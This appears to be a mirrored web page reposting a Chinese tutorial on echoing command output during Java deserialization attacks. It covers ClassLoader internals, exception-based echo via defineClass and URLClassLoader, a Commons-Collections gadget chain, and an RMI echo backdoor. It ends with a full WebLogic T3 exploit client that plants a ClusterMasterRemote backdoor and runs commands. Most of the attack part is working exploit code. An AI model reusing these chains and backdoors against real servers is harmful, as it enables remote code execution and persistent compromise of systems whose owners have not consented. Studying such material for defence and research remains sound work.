@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html class="no-js" lang="zh-CN">
+
+<head>
+        <link rel="canonical" href="https://myclash.github.io/news/article-45178.htm" />
+    <meta charset="utf-8" />
+    <meta http-equiv="x-ua-compatible" content="ie=edge" />
+    <title>java序列回显学习</title>
+        <meta name="description" content="java反序列化回显 在很多不出网的情况下，一种是写webshell(内存嘛)，另一种就是回显，本文先学习回显，回显的主要方式有一下几种。  defineClass RMI绑定实例 URLClassL" />
+        <link rel="icon" href="/assets/website/img/myclash/favicon.ico" type="image/x-icon"/>
+
+    <meta name="author" content="MyClash官网每日更新站">
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://myclash.github.io/news/article-45178.htm" />
+    <meta property="og:site_name" content="MyClash官网每日更新站" />
+    <meta property="og:title" content="java序列回显学习" />
+    <meta property="og:image" content="https://myclash.github.io/uploads/20240710/e1a948293df20524126d23c3e8e9f1da.webp" />
+        <meta property="og:release_date" content="2025-01-23T10:41:46" />
+    <meta property="og:updated_time" content="2025-01-23T10:41:46" />
+        <meta property="og:description" content="java反序列化回显 在很多不出网的情况下，一种是写webshell(内存嘛)，另一种就是回显，本文先学习回显，回显的主要方式有一下几种。  defineClass RMI绑定实例 URLClassL" />
+        
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <meta name="applicable-device" content="pc,mobile" />
+    <meta name="renderer" content="webkit" />
+    <meta name="force-rendering" content="webkit" />
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta name="robots" content="max-image-preview:large" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="java序列回显学习">
+    <meta name="format-detection" content="telephone=no">
+
+    <link rel="dns-prefetch" href="https:/www.googletagmanager.com">
+    <link rel="dns-prefetch" href="https://www.googleadservices.com">
+    <link rel="dns-prefetch" href="https://www.google-analytics.com">
+    <link rel="dns-prefetch" href="https://pagead2.googlesyndication.com">
+    <link rel="dns-prefetch" href="https://cm.g.doubleclick.net">
+    
+    <!-- Place favicon.ico in the root directory -->
+    <!-- ========================= CSS here ========================= -->
+    <link rel="stylesheet" href="/assets/website/css/myclash/bootstrap-5.0.0-alpha-2.min.css" />
+    <link rel="stylesheet" href="/assets/website/css/myclash/LineIcons.2.0.css" />
+    <link rel="stylesheet" href="/assets/website/css/myclash/animate.css" />
+    <link rel="stylesheet" href="/assets/website/css/myclash/tiny-slider.css" />
+    <link rel="stylesheet" href="/assets/website/css/myclash/glightbox.min.css" />
+    <link rel="stylesheet" href="/assets/website/css/myclash/lindy-uikit.css" />
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-JV5DZ5QQPV"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-JV5DZ5QQPV');
+</script>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3332997411212854"
+     crossorigin="anonymous"></script>
+</head>
+
+<body data-page="detail">
+    <!--[if lte IE 9]>
+      <p class="browserupgrade">
+        You are using an <strong>outdated</strong> browser. Please
+        <a href="https://browsehappy.com/">upgrade your browser</a> to improve
+        your experience and security.
+      </p>
+    <![endif]-->
+    <!-- ========================= preloader start ========================= -->
+    <div class="preloader">
+        <div class="loader">
+            <div class="spinner">
+                <div class="spinner-container">
+                    <div class="spinner-rotator">
+                        <div class="spinner-left">
+                            <div class="spinner-circle"></div>
+                        </div>
+                        <div class="spinner-right">
+                            <div class="spinner-circle"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- ========================= preloader end ========================= -->
+    <!-- ========================= hero-section-wrapper-2 start ========================= -->
+    <section id="home" class="hero-section-wrapper-2 list">
+                <!-- ========================= header-2 start ========================= -->
+        <header class="header header-2">
+            <div class="navbar-area">
+                <div class="container">
+                    <div class="row align-items-center">
+                        <div class="col-lg-12">
+                            <nav class="navbar navbar-expand-lg">
+                                <a class="navbar-brand" href="/">
+                                    My Clash
+                                </a>
+                                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent2" aria-controls="navbarSupportedContent2" aria-expanded="false" aria-label="Toggle navigation">
+                                    <span class="toggler-icon"></span>
+                                    <span class="toggler-icon"></span>
+                                    <span class="toggler-icon"></span>
+                                </button>
+                                <div class="collapse navbar-collapse sub-menu-bar" id="navbarSupportedContent2">
+                                    <ul id="nav2" class="navbar-nav ml-auto">
+                                                                                <li class="nav-item">
+                                            <a href="/">首页</a>
+                                        </li>
+                                                                                <li class="nav-item">
+                                            <a href="/free-nodes/">免费节点</a>
+                                        </li>
+                                                                                <li class="nav-item">
+                                            <a href="/paid-subscribe/">推荐机场</a>
+                                        </li>
+                                                                                <li class="nav-item">
+                                            <a href="/news/">新闻资讯</a>
+                                        </li>
+                                                                                <li class="nav-item">
+                                            <a href="#">关于</a>
+                                        </li>
+                                        <li class="nav-item">
+                                            <a href="#">联系</a>
+                                        </li>
+                                    </ul>
+                                </div>
+                                <!-- navbar collapse -->
+                            </nav>
+                            <!-- navbar -->
+                        </div>
+                    </div>
+                    <!-- row -->
+                </div>
+                <!-- container -->
+            </div>
+            <!-- navbar area -->
+        </header>
+        <!-- ========================= header-2 end ========================= -->
+        <!-- ========================= hero-2 start ========================= -->
+        <div class="hero-section hero-style-2">
+            <div class="container">
+                <div class="row align-items-end">
+                    <div class="col-lg-6">
+                        <div class="hero-content-wrapper">
+                            <h1 class="mb-30 wow fadeInUp" data-wow-delay=".4s">java序列回显学习</h1>
+                            <p class="mb-50 wow fadeInUp" data-wow-delay=".6s">
+                                <a href="/">首页</a> / <a href="/news/">新闻资讯</a> / <span>正文</span>
+                            </p>
+                        </div>
+                    </div>
+                    <div class="col-lg-6">
+                        <div class="hero-image">
+                            <img href="/assets/website/img/myclash/hero/hero-2/hero-img.svg" alt="" class="wow fadeInRight" data-wow-delay=".2s">
+                            <img href="/assets/website/img/myclash/hero/hero-2/paattern.svg" alt="" class="shape shape-1">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- ========================= hero-2 end ========================= -->
+    </section>
+    <!-- ========================= hero-section-wrapper-2 end ========================= -->
+    <!-- ========================= about style-3 start ========================= -->
+    <section id="about" class="about-section about-style-3">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-9">
+                                    <input type="hidden" id="share-website-info" data-name="" data-url="">
+                  				  				  				<h2 id="java反序列化回显">java反序列化回显</h2> <p>在很多不出网的情况下，一种是写webshell(内存嘛)，另一种就是回显，本文先学习回显，回显的主要方式有一下几种。</p> <ol> <li>defineClass</li> <li>RMI绑定实例</li> <li>URLClassLoader抛出异常</li> <li>中间件</li> <li>写文件css、js</li> <li>dnslog</li> </ol> <p>前面有多多少了解过ClassLoader本篇花费一节仔细学习一下</p> <h2 id="1前置知识">1、前置知识</h2> <p>classloader顾名思义，即是类加载。虚拟机把描述类的数据从class字节码文件加载到内存，并对数据进行检验、转换解析和初始化，最终形成可以被虚拟机直接使用的Java类型，这就是虚拟机的类加载机</p> <h3 id="11classloader加载过程">1.1、ClassLoader加载过程</h3> <p>主要是三个阶段</p> <p>第一个阶段是加载，把.class文件加载到内存，并为它创建一个java.lang.Class对象</p> <p>第二个阶段是连接，连接包括三阶段</p> <pre><code>验证：确保加载的类信息符合JVM规范，无安全方面的问题。  准备：为类的静态Field分配内存，并设置初始值，变量的初始值,如：int=0。  解析：将类的二进制数据中的符号引用替换成直接引用。</code></pre> <p>第三阶段是初始化</p> <p>1、优先对该类的父类进行初始化，然后对static修饰的变量和代码块进行初始化</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/d8861c750bc02a2794cfda8c4a049e36.jpg" alt="java序列回显学习"></p> <h3 id="12classloader双亲委托机制"><strong>1.2、classloader双亲委托机制</strong></h3> <p>当一个类加载的过程中，它首先不会去加载，而是委托给自己的父类去加载，父类又委托给自己的父类。因此所有的类加载都会委托给顶层的父类，即Bootstrap Classloader进行加载，然后父类自己无法完成这个加载请求，子加载器才会尝试自己去加载</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/e9dbfcb5c3a66620d0d955729a3c1b7f.jpg" alt="java序列回显学习"></p> <p>1.启动类加载器(Bootstrap Classloader)负责将&lt;JAVA_HOME&gt;/lib目录下并且被虚拟机识别的类库加载到虚拟机内存中。我们常用基础库，例如java.util.<strong>，java.io.</strong>，java.lang.**等等都是由根加载器加载</p> <p>2.扩展类加载器(Extention Classloader)负责加载JVM扩展类，比如swing系列、内置的js引擎、xml解析器等，这些类库以javax开头，它们的jar包位于&lt;JAVA_HOME&gt;/lib/ext目录中</p> <p>3.应用程序加载器(Application Classloader)也叫系统类加载器，它负责加载用户路径(ClassPath)上所指定的类库。我们自己编写的代码以及使用的第三方的jar包都是由它来加载的</p> <p>4.自定义加载器(Custom Classloader)通常是我们为了某些特殊目的实现的自定义加载器</p> <h3 id="13classloader类-核心方法">1.3、ClassLoader类 核心方法</h3> <pre><code>1.loadClass(String className)，根据名字加载一个类。 2.defineClass(String name, byte[] b, int off, int len)，将一个字节流定义为一个类。 3.findClass(String name)，查找一个类。 4.findLoadedClass(String name)，在已加载的类中，查找一个类。</code></pre> <h3 id="14自定义classloader">1.4、自定义Classloader</h3> <p>当加载一个类时，会首先从已经加载的类里面去查找这个类。如果类未加载，且如果父加载器不为空，则调用父加载器的loadClass方法进行加载，如果父加载器为空，则调用BootStrap class loader加载。如果依然没有加载到类，则调用findClass方法。而findClass方法是需要子类重写的。所以我们只需要继承classLoader重写findClass方法就可以实现自定义ClassLoader</p> <pre><code>1、继承classLoader 2、重写findClass()方法 3、在findClass()中调用defineClass</code></pre> <p>编写测试类</p> <pre><code class="language-java">package com.akkacloud.demo;  import java.io.*; import java.util.Arrays;  public class test {     public void testclassloder() {         System.out.println("test classloader");     }   }</code></pre> <p>编译成class文件</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/cdb63aac7272213df91c2c1e24306149.jpg" alt="java序列回显学习"></p> <p>编写自己的classLoder</p> <pre><code class="language-java">package com.akkacloud.demo;  import java.io.*; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method;  public class myClassloader extends ClassLoader{      private static String ClassName = "com.akkacloud.demo.test";     //获取class文件，转换成byte     private static byte[] getbyte() throws IOException {         InputStream is = new FileInputStream(new File("/Users/akka/Downloads/deserialzeEcho/src/main/java/com/akkacloud/demo/test.class"));         ByteArrayOutputStream outputStream = new ByteArrayOutputStream();         byte[] bytes = new byte[1024];         int temp;         while ((temp = is.read(bytes)) != -1) {             outputStream.write(bytes, 0, temp);         }         //转换后的byte[]         byte[] finalBytes = outputStream.toByteArray();         return finalBytes;      }      @Override     protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException {          //如果类名为我们定的类         if(name==ClassName){             try {                 //从字节中获取一个类                 return defineClass(ClassName, getbyte(),0,getbyte().length);             } catch (IOException e) {                 e.printStackTrace();             }         }         return super.findClass(name);     }      public static void main(String[] args) throws ClassNotFoundException {        //新建自定义的类加载器         myClassloader myClassloader = new myClassloader();         Class&lt;?&gt; aClass = myClassloader.loadClass(ClassName);         try {             //反射调用类的方法             Object o = aClass.newInstance();             Method declaredMethod = aClass.getMethod("testclassloder", null);             declaredMethod.invoke(o, null);         } catch (InstantiationException e) {             e.printStackTrace();         } catch (IllegalAccessException e) {             e.printStackTrace();         } catch (NoSuchMethodException e) {             e.printStackTrace();         } catch (InvocationTargetException e) {             e.printStackTrace();         }       } }</code></pre> <h2 id="2defineclass异常回显">2、defineClass异常回显</h2> <p>首先新建恶意异常回显类，并且编译成class文件</p> <pre><code class="language-java">package com.akkacloud.demo;  import java.io.BufferedReader; import java.io.IOException; import java.io.InputStream; import java.io.InputStreamReader;  public class Echo {     public Echo(String cmd) throws Exception {         ProcessBuilder processBuilder = new ProcessBuilder(new String[]{cmd});         Process start = processBuilder.start();         InputStream inputStream = start.getInputStream();         InputStreamReader inputStreamReader = new InputStreamReader(inputStream);         BufferedReader bufferedReader = new BufferedReader(inputStreamReader);         StringBuffer stringBuffer = new StringBuffer();          String line =null;         while ((line = bufferedReader.readLine()) != null) {             stringBuffer.append(line).append("\n");         }         throw new Exception(stringBuffer.toString());      } }</code></pre> <p>新建自己的classLoder</p> <pre><code class="language-java">package com.akkacloud.demo;  import java.io.*; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method;  public class myClassloader extends ClassLoader{      private static String ClassName = "com.akkacloud.demo.Echo";     //获取class文件，转换成byte     private static byte[] getbyte() throws IOException {         InputStream is = new FileInputStream(new File("/Users/akka/Downloads/deserialzeEcho/src/main/java/com/akkacloud/demo/Echo.class"));         ByteArrayOutputStream outputStream = new ByteArrayOutputStream();         byte[] bytes = new byte[1024];         int temp;         while ((temp = is.read(bytes)) != -1) {             outputStream.write(bytes, 0, temp);         }         //转换后的byte[]         byte[] finalBytes = outputStream.toByteArray();         return finalBytes;      }      @Override     protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException {          //如果类名为我们定的类         if(name==ClassName){             try {                 //从字节中获取一个类                 return defineClass(ClassName, getbyte(),0,getbyte().length);             } catch (IOException e) {                 e.printStackTrace();             }         }         return super.findClass(name);     }      public static void main(String[] args) {        //新建自定义的类加载器         myClassloader myClassloader = new myClassloader();             //反射调用类的方法         try {             Class&lt;?&gt; aClass = myClassloader.loadClass(ClassName);             Object o = aClass.getConstructor(String.class).newInstance("id");          } catch (InstantiationException e) {             e.printStackTrace();         } catch (IllegalAccessException e) {             e.printStackTrace();         } catch (InvocationTargetException e) {             e.printStackTrace();         } catch (NoSuchMethodException e) {             e.printStackTrace();         } catch (ClassNotFoundException e) {             e.printStackTrace();         }       } }</code></pre> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/6da4d6c4a7a61db86c61a40e0c899537.jpg" alt="java序列回显学习"></p> <h2 id="3urlclassloader异常回显">3、URLClassLoader异常回显</h2> <p>通过将回显结果封装到异常信息抛出拿到回显。</p> <p>异常回显类</p> <pre><code>package com.akkacloud.demo;  import java.io.BufferedReader; import java.io.IOException; import java.io.InputStream; import java.io.InputStreamReader;  public class Echo {     public Echo(String cmd) throws Exception {         ProcessBuilder processBuilder = new ProcessBuilder(new String[]{cmd});         Process start = processBuilder.start();         InputStream inputStream = start.getInputStream();         InputStreamReader inputStreamReader = new InputStreamReader(inputStream);         BufferedReader bufferedReader = new BufferedReader(inputStreamReader);         StringBuffer stringBuffer = new StringBuffer();          String line =null;         while ((line = bufferedReader.readLine()) != null) {             stringBuffer.append(line).append("\n");         }         throw new Exception(stringBuffer.toString());      } }</code></pre> <p>打jar包</p> <pre><code>javac Echo.java jar -cvf Echo.jar Echo.class</code></pre> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/9336ad56e008bf0fffbc517cb734e687.jpg" alt="java序列回显学习"></p> <p>使用URLClassLoader加载jar获得回显</p> <pre><code class="language-java">package com.akkacloud.demo;  import java.lang.reflect.InvocationTargetException; import java.net.MalformedURLException; import java.net.URL; import java.net.URLClassLoader;  public class myURLClassLoader {     public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {         URL url = new URL("http://localhost:8000/Echo.jar");         URL[] urls = {url};         URLClassLoader urlClassLoader = URLClassLoader.newInstance(urls);         Object o = urlClassLoader.loadClass("com.akkacloud.demo.Echo").getConstructor(String.class).newInstance("id");      } }</code></pre> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/157b39cd2aa8248065ccd6aed0831aa0.jpg" alt="java序列回显学习"></p> <h2 id="4改造cc链">4、改造cc链</h2> <p>把上面的代码换成反射执行先</p> <pre><code class="language-java">package com.akkacloud.demo;  import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap;  import javax.management.BadAttributeValueExpException; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.net.MalformedURLException; import java.net.URL; import java.net.URLClassLoader; import java.util.HashMap;  public class myURLClassLoader {     public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException { /*        URL url = new URL("http://localhost:8000/Echo.jar");         URL[] urls = {url};         URL[] urls= new URL[]{ new URL("http://localhost:8000/Echo.jar")};         */   /*         URLClassLoader urlClassLoader = URLClassLoader.newInstance(new URL[]{ new URL("http://localhost:8000/Echo.jar")});          Object o = urlClassLoader.loadClass("com.akkacloud.demo.Echo").getConstructor(String.class).newInstance("id");  */            Method getConstructorMethod = URLClassLoader.class.getClass().getMethod("getConstructor", new Class[]{Class[].class});         //new Object[]{}是invoke的参数类型要求，new Class[]{}是getConstructor的参数类型，URL[].class是具体调用newInstance需要传入url数组         Object getConstructor = getConstructorMethod.invoke(URLClassLoader.class, new Object[]{new Class[]{URL[].class}});         System.out.println(getConstructor);          Method newInstanceMethod = getConstructor.getClass().getMethod("newInstance", new Class[]{Object[].class});         URLClassLoader urlClassLoader = (URLClassLoader) newInstanceMethod.invoke(getConstructor, new Object[]{new Object[]{new URL[]{new URL("http://127.0.0.1:8000/ProcessExec.jar")}}});         System.out.println(urlClassLoader);           Class aClass = urlClassLoader.getClass();         Method loadClassMethod = aClass.getMethod("loadClass", new Class[]{String.class});         Object Echo = loadClassMethod.invoke(urlClassLoader, new Object[]{"com.akkacloud.demo.Echo"});         System.out.println(Echo);          Method getEchoConstructor = Echo.getClass().getMethod("getConstructor", new Class[]{Class[].class});         Object EchoConstrutor = getEchoConstructor.invoke(Echo, new Object[]{new Class[]{String.class}});         System.out.println(EchoConstrutor);           Method EchonewInstance = EchoConstrutor.getClass().getMethod("newInstance", new Class[]{Object[].class});         EchonewInstance.invoke(EchoConstrutor, new Object[]{new String[]{"id"}});           }  }</code></pre> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/4dd233ab0e0740d7646e3965cff8c9d9.jpg" alt="java序列回显学习"></p> <p>改造cc</p> <pre><code class="language-java">package com.akkacloud.demo;  import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap;  import javax.management.BadAttributeValueExpException; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.net.MalformedURLException; import java.net.URL; import java.net.URLClassLoader; import java.util.HashMap;  public class myURLClassLoader {     public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException {          ChainedTransformer chain = new ChainedTransformer(new Transformer[] {                     new ConstantTransformer(URLClassLoader.class),                     new InvokerTransformer("getConstructor",                             new Class[]{Class[].class},                             new Object[]{new Class[]{URL[].class}}),                     new InvokerTransformer("newInstance",                             new Class[]{Object[].class},                             new Object[]{new Object[]{new URL[]{new URL("http://127.0.0.1:8000/Echo.jar")}}}),                      new InvokerTransformer("loadClass",                             new Class[]{String.class},                             new Object[]{"com.akkacloud.demo.Echo"}),                      new InvokerTransformer("getConstructor",                             new Class[]{Class[].class},                             new Object[]{new Class[]{String.class}}),                     new InvokerTransformer("newInstance",                             new Class[]{Object[].class},                             new Object[]{new String[]{"id"}})               });              HashMap innermap = new HashMap();             LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);             TiedMapEntry tiedmap = new TiedMapEntry(map,123);             BadAttributeValueExpException poc = new BadAttributeValueExpException(1);             Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");             val.setAccessible(true);             val.set(poc,tiedmap);              try{                 ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc5"));                 outputStream.writeObject(poc);                 outputStream.close();                  ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc5"));                 inputStream.readObject();             }catch(Exception e){                 e.printStackTrace();             }         }  }</code></pre> <h2 id="5绑定rmi实例回显">5、绑定RMI实例回显</h2> <p>1、编写接口类</p> <pre><code class="language-java">package com.akkacloud.rmi;  import java.io.IOException; import java.rmi.Remote;  public interface Echo extends Remote {     public String Echo(String cmd) throws IOException; }</code></pre> <p>2、编写接口实现类，重写Echo方法，传入恶意代码</p> <pre><code class="language-java">package com.akkacloud.rmi;  import java.io.IOException; import java.io.InputStream; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; import java.util.Scanner;  public class EchoImpl extends UnicastRemoteObject implements Echo {     protected EchoImpl() throws RemoteException {         super();     }      @Override     public String Echo(String cmd) throws IOException {         InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();         Scanner scanner = new Scanner(inputStream).useDelimiter("\\a");         String s = scanner.hasNext() ? scanner.next() : "";         System.out.println("123");         return s;     } }</code></pre> <p>3、编写Rmi服务端</p> <pre><code class="language-java">package com.akkacloud.rmi;  import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry;  public class RmiServer {     public static void main(String[] args) throws RemoteException, AlreadyBoundException {         EchoImpl echo = new EchoImpl();         System.out.println(echo);         Registry registry = LocateRegistry.createRegistry(1234);         registry.bind("Echo",echo );         System.out.println("rmiserver is running");     } }</code></pre> <p>4、编写客户端</p> <pre><code class="language-java">package com.akkacloud.rmi;  import java.io.IOException; import java.rmi.NotBoundException; import java.rmi.Remote; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry;  public class RmiClient {     public static void main(String[] args) throws IOException, NotBoundException {          Registry registry = LocateRegistry.getRegistry("localhost", 1234);         Echo echo = (Echo)registry.lookup("Echo");         System.out.println(echo);         System.out.println(echo.Echo("id"));      } }</code></pre> <p>服务端总体流程</p> <p>1、编写接口继承Remote</p> <p>2、编写接口的Echo方法抛出java.rmi.RemoteException 异常</p> <p>3、编写接口实现类EchoImpl，</p> <p>4、重写Echo方法</p> <p>5、新建接口实现类并且绑定在注册中心</p> <p>客户端总体流程</p> <p>1、查找注册中心的对应方法</p> <p>2、调用该方法</p> <p>这里大佬在有个思路，通过common-collection反序列化调用ClassLoader，通过字节码来自定义一个RMI接口类，在类实现的方法中返回命令执行的结果,其实就是打入一个rmi的后门，然后进行调用该后门进行执行命令，并且回显。但是还有几个问题</p> <ol> <li> <p>defineClass需要ClassLoader的子类才能拿到</p> <p>定义了defineClass</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/5fa287d98043c948e3100126d55c4dae.jpg" alt="java序列回显学习"></p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/26ea0629a3bfc0f7ae500684c213ddf6.jpg" alt="java序列回显学习"></p> <pre><code class="language-fallback">org.mozilla.classfile.DefiningClassLoader#defineClass</code></pre> </li> <li> <p>具体应该实现哪个RMI接口类呢？</p> <p>返回为String类型且继承了Remote并且抛出java.rmi.RemoteException</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/52e2f8a10cd1a53dca310199f5bfc246.jpg" alt="java序列回显学习"></p> </li> <li> <p>common-collection构造的问题</p> </li> </ol> <pre><code class="language-java">// common-collection1 构造transformers 定义自己的RMI接口 Transformer[] transformers = new Transformer[]{     new ConstantTransformer(DefiningClassLoader.class),     new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),     new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),     new InvokerTransformer("defineClass",                            new Class[]{String.class, byte[].class}, new Object[]{className, clsData}),     new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"main", new Class[]{String[].class}}),     new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),     new ConstantTransformer(new HashSet())};</code></pre> <p>idea导入weblogic的包，modules和wlserver_10.3/server下的lib包。然后导入https://github.com/5up3rc/weblogic_cmd该项目。</p> <p>首先先写回显类既Remote实现类</p> <pre><code class="language-java">package com.supeream;  import weblogic.cluster.singleton.ClusterMasterRemote;  import javax.naming.Context; import javax.naming.InitialContext; import javax.naming.NamingException; import java.io.BufferedReader; import java.io.ByteArrayOutputStream; import java.io.InputStream; import java.io.InputStreamReader; import java.rmi.RemoteException; import java.util.ArrayList; import java.util.List;  public class RemoteImpl implements ClusterMasterRemote {      public static void main(String[] args) {         RemoteImpl remote = new RemoteImpl();         try {             Context context = new InitialContext();             context.rebind("echo",remote);         } catch (Exception e) {             e.printStackTrace();         }     }       @Override     public void setServerLocation(String cmd, String args) throws RemoteException {      }       @Override     public String getServerLocation(String cmd) throws RemoteException {         try {             if (cmd.equals("unbind")) {                 Context ctx = new InitialContext();                 ctx.unbind("echo");                 return null;             } else{                 String name = System.getProperty("os.name");                 String[] cmds = name != null &amp;&amp; name.toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"sh", "-c", cmd};                 InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();                 byte[] buf = new byte[1024];                 int len = 0;                 ByteArrayOutputStream out = new ByteArrayOutputStream();                 while ((len = in.read(buf)) != -1) {                     out.write(buf, 0, len);                 }                 return new String(out.toByteArray());             }         } catch (Exception e) {             return e.getMessage();         }     } }</code></pre> <p>工具类</p> <pre><code class="language-java">package com.supeream;  import java.io.*; import java.util.Arrays;  public class Tobyte {     public static byte[] getbyte(String path) throws IOException {          InputStream in = new FileInputStream(path);         byte[] classBytes;         classBytes = new byte[in.available()];         in.read(classBytes);         in.close();         return classBytes;     }       public static void main(String[] args) throws IOException {         byte[] getbyte = Tobyte.getbyte("/Users/akka/Desktop/RemoteImpl.class");         System.out.println(Arrays.toString(getbyte));     } }</code></pre> <p>rmi客户端类</p> <pre><code class="language-java">package com.supeream;  import com.supeream.serial.Reflections; import com.supeream.serial.SerialDataGenerator; import com.supeream.serial.Serializables; import com.supeream.ssl.WeblogicTrustManager; import com.supeream.weblogic.T3ProtocolOperation; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.mozilla.classfile.DefiningClassLoader; import weblogic.cluster.singleton.ClusterMasterRemote; import weblogic.corba.utils.MarshalledObject; import weblogic.jndi.Environment;  import javax.naming.Context; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.HashSet; import java.util.Map;  public class test {     private static String host = "172.20.10.4";     private static String port = "7001";     private static final String classname = "com.supeream.RemoteImpl";      private static  byte[] bs ;      public static void main(String[] args) {         try {             String url = "t3://" + host + ":" + port;             // 安装RMI实例             bs=Tobyte.getbyte("/Users/akka/Desktop/RemoteImpl.class");             invokeRMI(classname, bs);              Environment environment = new Environment();             environment.setProviderUrl(url);             environment.setEnableServerAffinity(false);             environment.setSSLClientTrustManager(new WeblogicTrustManager());             Context context = environment.getInitialContext();             ClusterMasterRemote remote = (ClusterMasterRemote) context.lookup("echo");              // 调用RMI实例执行命令             String res = remote.getServerLocation("ipconfig");             System.out.println(res);         } catch (Exception e) {             e.printStackTrace();         }      }      private static void invokeRMI(String className, byte[] clsData) throws Exception {         // common-collection1 构造transformers 定义自己的RMI接口         Transformer[] transformers = new Transformer[]{                 new ConstantTransformer(DefiningClassLoader.class),                 new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),                 new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),                 new InvokerTransformer("defineClass",                         new Class[]{String.class, byte[].class}, new Object[]{className, clsData}),                 new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"main", new Class[]{String[].class}}),                 new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{null}}),                 new ConstantTransformer(new HashSet())};          final Transformer transformerChain = new ChainedTransformer(transformers);         final Map innerMap = new HashMap();          final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);          InvocationHandler handler = (InvocationHandler) Reflections                 .getFirstCtor(                         "sun.reflect.annotation.AnnotationInvocationHandler")                 .newInstance(Override.class, lazyMap);          final Map mapProxy = Map.class                 .cast(Proxy.newProxyInstance(SerialDataGenerator.class.getClassLoader(),                         new Class[]{Map.class}, handler));          handler = (InvocationHandler) Reflections.getFirstCtor(                 "sun.reflect.annotation.AnnotationInvocationHandler")                 .newInstance(Override.class, mapProxy);          // 序列化数据 MarshalledObject绕过         Object obj = new MarshalledObject(handler);         ByteArrayOutputStream out = new ByteArrayOutputStream();         ObjectOutputStream objOut = new ObjectOutputStream(out);         objOut.writeObject(obj);         objOut.flush();         objOut.close();         byte[] payload = out.toByteArray();         // t3发送         T3ProtocolOperation.send(host, port, payload);     } }</code></pre> <p>如T3ProtocolOperation报错，需要修改两处</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/15afc00ba6d6e00586449813edf63576.jpg" 